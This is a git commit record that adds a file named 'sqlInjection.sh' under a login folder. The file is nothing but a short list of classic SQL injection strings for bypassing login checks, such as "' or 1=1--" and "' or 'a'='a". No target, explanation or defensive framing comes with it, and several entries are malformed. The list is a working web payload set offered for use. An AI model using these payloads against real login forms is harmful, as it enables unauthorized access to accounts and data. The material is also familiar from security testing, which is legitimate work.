30c7e3ac9c50340aba7b53e6755dc7414d06a62b
Ryan Dewantoro <riiean@umsida.ac.id>
2020-11-13 11:36:36 +0700

    Create sqlInjection.sh

---
+++ shell/login/sqlInjection.sh
@@ -0,0 +1,6 @@
+or 1=1--	" or "1"="1	") or ("a"="a
+" or 1=1--	' or 1=1--	tes " or "a"="a
+or 0=0#	' or = 0=0#	tes' or 'a'='a
+" or 0=0#	or 1=1--	tes") or ("a"="a
+' or '0'='0	') or ('a'='a	tes') or ('a'='a
+ 
